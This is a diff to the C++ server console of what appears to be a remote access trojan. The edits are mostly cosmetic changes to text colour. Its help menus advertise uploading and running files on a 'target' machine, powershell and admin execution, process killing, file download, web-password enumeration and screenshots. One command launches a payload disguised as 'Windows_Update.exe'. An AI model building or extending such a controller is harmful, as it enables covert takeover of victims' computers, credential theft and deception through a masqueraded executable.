@@ -2,13 +2,13 @@
 
 void Info::list_scripts()
 {
-	SetColor(2);
+	//SetColor(2);
 	std::cout << "[\t\t------------ List of all scripts ------------" << std::endl;
 	std::cout << "[ You can enter : man <command> for more informations about a command" << std::endl;
 	std::cout << "[	Man is only for exploit for transfer scripts " << std::endl;
-	SetColor(14);
+	//SetColor(14);
 	std::cout << "#------------------------------ Folder action -----------------------------#" << std::endl;
-	SetColor(6);
+//	SetColor(6);
 	std::cout << "[ pwd\t\t\t\t\t: Print the current path" << std::endl;
 	std::cout << "[ ls\t\t\t\t\t: List all files and folders in the current directory" << std::endl;
 	std::cout << "[ getTemp\t\t\t\t: Get the location of the temp directory" << std::endl;
@@ -16,9 +16,9 @@ void Info::list_scripts()
 	std::cout << "[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory" << std::endl;
 	std::cout << "[ download \"filename\"\t\t\t: Download a file located in the current directory (you can target an another using cd)" << std::endl;
 	std::cout << "[ download_dir \"filename\"\t\t: Download the target directory   ------NOT IMPLEMENTED" << std::endl;
-	SetColor(14);
+	//SetColor(14);
 	std::cout << "#----------------------------- System commands ----------------------------#" << std::endl;
-	SetColor(6);
+	//SetColor(6);
 	std::cout << "[ cd <directory>\t\t\t\t: Change directory" << std::endl;
 	std::cout << "[ ps\t\t\t\t\t: List all process with their PID and name" << std::endl;
 	std::cout << "[ kill -p <pid>\t\t\t\t: Kill a process by its PID" << std::endl;
@@ -31,24 +31,24 @@ void Info::list_scripts()
 	std::cout << "[ powershell <command>\t\t\t:Run a command using powershell" << std::endl;
 	std::cout << "[ exe_admin <file_name>\t\t\t: Execute a file (.exe) in admin mode" << std::endl;
 	std::cout << "[ exe <file_name>\t\t\t: Execute a file" << std::endl;
-	SetColor(14);
+	//SetColor(14);
 	std::cout << "#-------------------------------- Exploit ----------------------------------#" << std::endl;
-	SetColor(6);
+//	SetColor(6);
 	std::cout << "[ geo\t\t\t\t: Give the localization of the current session------NOT IMPLEMENTED" << std::endl;
 	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session------NOT IMPLEMENTED" << std::endl;
 	std::cout << "[ screenshot\t\t\t: Take a screenshot from the current target screen------NOT IMPLEMENTED" << std::endl;
 	std::cout << "[ ask <exe> <name>\t\t: Upload and execute a given file as administrator with a custom name" << std::endl;
 	std::cout << "[ you can choose a new file_name, default is Windows_Update.exe" << std::endl;
 
-	SetColor(7);
+//	SetColor(7);
 }
 
 void Info::print_help()
 {
-	SetColor(2);
+//	SetColor(2)
 	std::cout << "[*] You have now acces to the payload\n" << std::endl;
 	std::cout << "[\t\t------------ List of Commands ------------\t\t]" << std::endl;
-	SetColor(6);
+	//SetColor(6);
 	std::cout << "[ help\t\t\t: list all commands" << std::endl;
 	std::cout << "[ man <command>\t\t: Give more informations about a command" << std::endl;
 	std::cout << "[Man is only for exploit and transfer scripts " << std::endl;
@@ -61,7 +61,7 @@ void Info::print_help()
 	std::cout << "[ list\t\t\t: list all actives sessions" << std::endl;
 	std::cout << "[ exit_session <number>\t: Exit a given session" << std::endl;
 	std::cout << "[ exit\t\t\t: exit the program" << std::endl;
-	SetColor(7);
+//	SetColor(7);
 }
 
  bool Info::set_session(Server* server,const std::string nb_session)
@@ -100,11 +100,11 @@ void Info::version(Server* server)
 }
 void Info::getcurrentsession(Server* server)
 {
-	SetColor(14);
-	std::cout << "Current session number : " << server->getDefaultClient().number <<std::endl;
-	std::cout << "Connected with : " << server->getDefaultClient().ip_extern << std::endl;
-	SetColor(7);
+	print_status("Current session number : " + server->getDefaultClient().number);
+	print_status("Connected with : " + server->getDefaultClient().ip_extern);
+	
 }
+#ifdef _WIN32
 void SetColor(int value)
 {
 	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), value);
@@ -127,6 +127,7 @@ void SetColor(int value)
 	- Numbers after 15 are background colors -
 	*/
 }
+#endif
 void Transfer::uploadToClient(Server* serv1,SOCKET cl_sock, const std::string filename)
 {
 	std::cout << "[*] Starting the upload of : " << filename << std::endl;
